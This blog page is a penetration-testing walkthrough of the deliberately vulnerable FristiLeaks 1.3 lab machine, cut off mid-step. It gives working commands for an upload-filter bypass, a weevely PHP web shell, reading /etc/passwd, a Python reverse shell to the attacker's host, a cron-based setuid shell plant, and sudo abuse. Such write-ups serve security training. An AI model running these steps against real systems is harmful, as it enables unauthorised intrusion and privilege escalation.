
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>0x73696e65</title>
  <meta name="author" content="Norbert Szetei">

  
  <meta name="description" content="Image: FristiLeaks: 1.3 Nmap output: 1
2
3
4
5
6
7
8
root@kali32:~$ sudo nmap 192.168.80.128 -sT -p- Starting Nmap 7.00 ( https://nmap.org ) at 2015- &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://73696e65.github.io/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-64260520-1']);
    _gaq.push(['_setDomainName','github.io']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">0x73696e65</a></h1>
  
    <h2>information security notes</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="73696e65.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/12/15/fristileaks-1-dot-3/">FristiLeaks: 1.3</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-12-15T08:45:49+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:45 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">FristiLeaks: 1.3</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ sudo nmap 192.168.80.128 -sT -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.00 ( https://nmap.org ) at 2015-12-14 23:16 CET
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1055.59 seconds</span></code></pre></td></tr></table></div></figure>


<p>Only http port is open. There is a <code>robots.txt</code> file with the following content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /cola
</span><span class='line'>Disallow: /sisi
</span><span class='line'>Disallow: /beer</span></code></pre></td></tr></table></div></figure>


<p>Nothing useful here, but our guess to try <code>/fristi</code> reveals in comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
</span><span class='line'><span class="c">TODO:</span>
</span><span class='line'><span class="c">We need to clean this up for production. I left some junk in here to make testing easier.</span>
</span><span class='line'>
</span><span class='line'><span class="c">- by eezeepz</span>
</span><span class='line'><span class="c">--&gt;</span>
</span><span class='line'>...
</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
</span><span class='line'>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
</span><span class='line'>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
</span><span class='line'>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
</span><span class='line'>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
</span><span class='line'>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
</span><span class='line'>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
</span><span class='line'>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
</span><span class='line'>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
</span><span class='line'>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
</span><span class='line'>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
</span><span class='line'>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
</span><span class='line'>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
</span><span class='line'>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
</span><span class='line'>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
</span><span class='line'>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
</span><span class='line'>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
</span><span class='line'>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
</span><span class='line'>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
</span><span class='line'>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
</span><span class='line'>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
</span><span class='line'>U5ErkJggg==
</span></code></pre></td></tr></table></div></figure>


<p>The first hint was about username, the second one contains base64 encoded <code>png</code>
file with the password. So we use them (<code>eezeepz / keKkeKKeKKeKkEkkEk</code>). Now we
need to evade the image upload filtering.</p>

<p>After trying different methods, finally we change for POST method the request for
double extensions, more here: <a href="https://www.acunetix.com/websitesecurity/upload-forms-threat/">Case 5</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;test.php.gif&quot;
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'>Uploading, please wait<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>The file has been uploaded to /uploads <span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The file that we uploaded was generated using <code>weevely</code> and after connecting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ weevely generate 1234 /tmp/test.php.gif
</span><span class='line'>
</span><span class='line'>root@kali32:~$ weevely http://192.168.80.128/fristi/uploads/test.php.gif 1234 id
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
</span><span class='line'>
</span><span class='line'>root@kali32:~$ weevely http://192.168.80.128/fristi/uploads/test.php.gif 1234</span></code></pre></td></tr></table></div></figure>


<p>Doing a little investigation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">localhost</span><span class="o">.</span><span class="nx">localdomain</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">fristi</span> <span class="err">$</span> <span class="nx">head</span> <span class="nx">checklogin</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nb">ob_start</span><span class="p">();</span>
</span><span class='line'><span class="nv">$host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span> <span class="c1">// Host name</span>
</span><span class='line'><span class="nv">$username</span><span class="o">=</span><span class="s2">&quot;eezeepz&quot;</span><span class="p">;</span> <span class="c1">// Mysql username</span>
</span><span class='line'><span class="nv">$password</span><span class="o">=</span><span class="s2">&quot;4ll3maal12#&quot;</span><span class="p">;</span> <span class="c1">// Mysql password</span>
</span><span class='line'><span class="nv">$db_name</span><span class="o">=</span><span class="s2">&quot;hackmenow&quot;</span><span class="p">;</span> <span class="c1">// Database name</span>
</span><span class='line'><span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">&quot;members&quot;</span><span class="p">;</span> <span class="c1">// Table name</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Connect to server and select databse.</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>localhost.localdomain:/var/www/html/fristi/uploads $ :audit_etcpasswd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
</span><span class='line'>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
</span><span class='line'>saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
</span><span class='line'>postfix:x:89:89::/var/spool/postfix:/sbin/nologin
</span><span class='line'>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
</span><span class='line'>apache:x:48:48:Apache:/var/www:/sbin/nologin
</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
</span><span class='line'>vboxadd:x:498:1::/var/run/vboxadd:/bin/false
</span><span class='line'>eezeepz:x:500:500::/home/eezeepz:/bin/bash
</span><span class='line'>admin:x:501:501::/home/admin:/bin/bash
</span><span class='line'>fristigod:x:502:502::/var/fristigod:/bin/bash
</span><span class='line'>fristi:x:503:100::/var/www:/sbin/nologin</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>localhost.localdomain:/var/www/html/fristi/uploads $ :audit_suidsgid /
</span><span class='line'>+----------------------------------+
</span><span class='line'>| /bin/mount                       |
</span><span class='line'>| /bin/fusermount                  |
</span><span class='line'>| /bin/umount                      |
</span><span class='line'>| /bin/su                          |
</span><span class='line'>| /bin/ping                        |
</span><span class='line'>| /bin/ping6                       |
</span><span class='line'>| /sbin/netreport                  |
</span><span class='line'>| /sbin/pam_timestamp_check        |
</span><span class='line'>| /sbin/unix_chkpwd                |
</span><span class='line'>| /usr/bin/crontab                 |
</span><span class='line'>| /usr/bin/chsh                    |
</span><span class='line'>| /usr/bin/sudo                    |
</span><span class='line'>| /usr/bin/chfn                    |
</span><span class='line'>| /usr/bin/write                   |
</span><span class='line'>| /usr/bin/newgrp                  |
</span><span class='line'>| /usr/bin/ssh-agent               |
</span><span class='line'>| /usr/bin/chage                   |
</span><span class='line'>| /usr/bin/gpasswd                 |
</span><span class='line'>| /usr/bin/passwd                  |
</span><span class='line'>| /usr/bin/wall                    |
</span><span class='line'>| /usr/libexec/utempter/utempter   |
</span><span class='line'>| /usr/libexec/openssh/ssh-keysign |
</span><span class='line'>| /usr/libexec/pt_chown            |
</span><span class='line'>| /usr/sbin/suexec                 |
</span><span class='line'>| /usr/sbin/postqueue              |
</span><span class='line'>| /usr/sbin/usernetctl             |
</span><span class='line'>| /usr/sbin/postdrop               |
</span><span class='line'>+----------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>We use another python backdoor as reverse shell to redirect tty in python:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1337
</span><span class='line'>
</span><span class='line'>weevely> python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1337</span></code></pre></td></tr></table></div></figure>


<p>In the home directory of <code>eezeepz</code> user, there is <code>notes.txt</code> file with the instruction for cron:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat /home/eezeepz/notes.txt
</span><span class='line'>cat /home/eezeepz/notes.txt
</span><span class='line'>Yo EZ,
</span><span class='line'>
</span><span class='line'>I made it possible for you to do some automated checks,
</span><span class='line'>but I did only allow you access to /usr/bin/* system binaries. I did
</span><span class='line'>however copy a few extra often needed commands to my
</span><span class='line'>homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
</span><span class='line'>from /home/admin/
</span><span class='line'>
</span><span class='line'>Don't forget to specify the full path for each binary!
</span><span class='line'>
</span><span class='line'>Just put a file called "runthis" in /tmp/, each line one command. The
</span><span class='line'>output goes to the file "cronresult" in /tmp/. It should
</span><span class='line'>run every minute with my account privileges.
</span><span class='line'>
</span><span class='line'>- Jerry</span></code></pre></td></tr></table></div></figure>


<p>The escalation process is straightforward, we inject our code to execute shell
and set suid permission using admin&rsquo;s account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ echo '#include &lt;stdio.h>
</span><span class='line'>#include &lt;stdlib.h>
</span><span class='line'>#include &lt;sys/types.h>
</span><span class='line'>#include &lt;unistd.h>
</span><span class='line'>
</span><span class='line'>int main()
</span><span class='line'>{
</span><span class='line'>   setreuid(geteuid(),geteuid());
</span><span class='line'>   execve("/bin/sh", NULL, NULL);
</span><span class='line'>
</span><span class='line'>   return 0;
</span><span class='line'>}
</span><span class='line'>' > /tmp/run.c</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ gcc run.c -o run
</span><span class='line'>gcc run.c -o run
</span><span class='line'>
</span><span class='line'>bash-4.1$ echo "/home/admin/cat /tmp/run > /tmp/run-admin" > /tmp/runthis
</span><span class='line'>bash-4.1$ echo "/home/admin/chmod a+xs /tmp/run-admin" >> /tmp/runthis</span></code></pre></td></tr></table></div></figure>


<p>After the few seconds of waiting, we escalated our privileges to <code>admin</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ ./run-admin
</span><span class='line'>./run-admin
</span><span class='line'>bash-4.1$ id
</span><span class='line'>id
</span><span class='line'>uid=501(admin) gid=48(apache) groups=48(apache)</span></code></pre></td></tr></table></div></figure>


<p>We do some recon in admin directory, there is obfuscated password and encoding routine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat whoisyourgodnow.txt
</span><span class='line'>cat whoisyourgodnow.txt
</span><span class='line'>=RFn0AKnlMHMPIzpyuTI0ITG</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span><span class="o">-</span><span class="mf">4.1</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">encodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
</span><span class='line'>    <span class="n">base64string</span><span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">base64string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;rot13&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">cryptoResult</span><span class="o">=</span><span class="n">encodeString</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="k">print</span> <span class="n">cryptoResult</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the password is at first base64 encoded, then reversed and shifted using rot13. We reverse the process in python:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
</span><span class='line'><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;=RFn0AKnlMHMPIzpyuTI0ITG&#39;</span><span class="p">,</span> <span class="s">&#39;rot13&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
</span><span class='line'><span class="s">&#39;LetThereBeFristi!&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We found the password for <code>fristigod</code> user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ su fristigod
</span><span class='line'>su fristigod
</span><span class='line'>Password: LetThereBeFristi!
</span><span class='line'>
</span><span class='line'>bash-4.1$ id
</span><span class='line'>id
</span><span class='line'>uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</span></code></pre></td></tr></table></div></figure>


<p>In his directory, there is a binary with the user authorization and
<code>.bash_history</code> file, we use <code>sudo</code> the same way as previously invoked according the history file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ sort -u .bash_history
</span><span class='line'>./doCom
</span><span class='line'>./doCom test
</span><span class='line'>Fexit
</span><span class='line'>cd .secret_admin_stuff/
</span><span class='line'>exit
</span><span class='line'>groups
</span><span class='line'>less /var/log/secure e
</span><span class='line'>ls
</span><span class='line'>ls -lah
</span><span class='line'>pwd
</span><span class='line'>sudo -u fristi ./doCom ls /
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>sudo ls
</span><span class='line'>usermod -G fristigod fristi
</span><span class='line'>
</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span><span class='line'>[sudo] password for fristigod: LetThereBeFristi!
</span><span class='line'>
</span><span class='line'>bin   dev  home  lib64       media  opt   root  selinux  sys  usr
</span><span class='line'>boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
</span><span class='line'>bash-4.1$
</span><span class='line'>
</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
